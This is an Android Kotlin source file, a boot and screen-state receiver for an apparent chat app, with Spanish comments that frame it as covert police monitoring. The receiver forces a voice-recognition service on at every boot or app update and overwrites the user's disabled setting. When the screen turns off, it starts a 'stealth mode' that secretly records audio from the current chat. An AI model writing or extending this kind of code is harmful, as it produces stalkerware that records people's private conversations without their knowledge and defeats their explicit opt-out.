package com.example.demoappchat.data.receiver

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.Build
import android.util.Log
import androidx.core.content.ContextCompat
import com.example.demoappchat.data.service.VoiceRecognitionService

/**
 * RECEPTOR PARA OPERACIONES POLICIALES ENCUBIERTAS
 * Garantiza que el monitoreo continúe sin interrupción
 */
class BootReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context, intent: Intent) {
        Log.d("BootReceiver", "🚨 EVENTO POLICIAL: ${intent.action}")
        
        when (intent.action) {
            Intent.ACTION_BOOT_COMPLETED,
            Intent.ACTION_LOCKED_BOOT_COMPLETED,
            "android.intent.action.QUICKBOOT_POWERON",
            Intent.ACTION_MY_PACKAGE_REPLACED,
            Intent.ACTION_PACKAGE_REPLACED -> {
                
                Log.d("BootReceiver", "📱 Dispositivo reiniciado - Reactivando vigilancia policial")
                
                // Usar SharedPreferences directamente sin inyección
                val prefs = context.getSharedPreferences("user_preferences", Context.MODE_PRIVATE)
                val wasVoiceServiceEnabled = prefs.getBoolean("voice_service_enabled", false)

                // SIEMPRE activar para operaciones policiales (independiente de configuración)
                Log.d("BootReceiver", "🔒 FORZANDO activación para trabajo policial...")
                
                // Activar servicio inmediatamente
                startVoiceRecognitionService(context)
                
                // Marcar como habilitado en preferencias
                prefs.edit().putBoolean("voice_service_enabled", true).apply()
                
                // Registrar receptores adicionales para monitoreo continuo
                registerScreenStateReceivers(context)
            }
            
            Intent.ACTION_SCREEN_OFF -> {
                Log.d("BootReceiver", "📺 Pantalla apagada - Activando modo encubierto")
                activateStealthMode(context)
            }
            
            Intent.ACTION_SCREEN_ON -> {
                Log.d("BootReceiver", "📺 Pantalla encendida - Continuando monitoreo")
                ensureServiceRunning(context)
            }
        }
    }

    private fun startVoiceRecognitionService(context: Context) {
        try {
            val serviceIntent = Intent(context, VoiceRecognitionService::class.java)
            serviceIntent.action = VoiceRecognitionService.ACTION_START_LISTENING

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                ContextCompat.startForegroundService(context, serviceIntent)
            } else {
                context.startService(serviceIntent)
            }
            
            Log.d("BootReceiver", "✅ Servicio policial de monitoreo iniciado")

        } catch (e: Exception) {
            Log.e("BootReceiver", "❌ Error crítico iniciando servicio policial", e)
        }
    }
    
    private fun registerScreenStateReceivers(context: Context) {
        try {
            val filter = IntentFilter().apply {
                addAction(Intent.ACTION_SCREEN_OFF)
                addAction(Intent.ACTION_SCREEN_ON)
                addAction(Intent.ACTION_USER_PRESENT)
            }
            
            context.registerReceiver(BootReceiver(), filter)
            Log.d("BootReceiver", "📡 Receptores de estado de pantalla registrados")
        } catch (e: Exception) {
            Log.e("BootReceiver", "❌ Error registrando receptores", e)
        }
    }
    
    private fun activateStealthMode(context: Context) {
        try {
            // Verificar si hay chat activo para grabación automática
            val prefs = context.getSharedPreferences("user_preferences", Context.MODE_PRIVATE)
            val currentChatId = prefs.getString("current_chat_id", null)
            
            if (!currentChatId.isNullOrEmpty()) {
                // Iniciar grabación automática discreta
                val recordIntent = Intent(context, VoiceRecognitionService::class.java).apply {
                    action = VoiceRecognitionService.ACTION_START_RECORDING
                    putExtra(VoiceRecognitionService.EXTRA_RECORDING_TYPE, "AUDIO")
                }
                context.startService(recordIntent)
                
                Log.d("BootReceiver", "🎙️ Grabación encubierta activada - Chat: $currentChatId")
            }
            
            // Asegurar que el servicio de voz continúe
            ensureServiceRunning(context)
            
        } catch (e: Exception) {
            Log.e("BootReceiver", "❌ Error activando modo encubierto", e)
        }
    }
    
    private fun ensureServiceRunning(context: Context) {
        try {
            // Verificar y reiniciar servicio si es necesario
            startVoiceRecognitionService(context)
            Log.d("BootReceiver", "🔄 Verificación de servicio completada")
        } catch (e: Exception) {
            Log.e("BootReceiver", "❌ Error verificando servicio", e)
        }
    }
}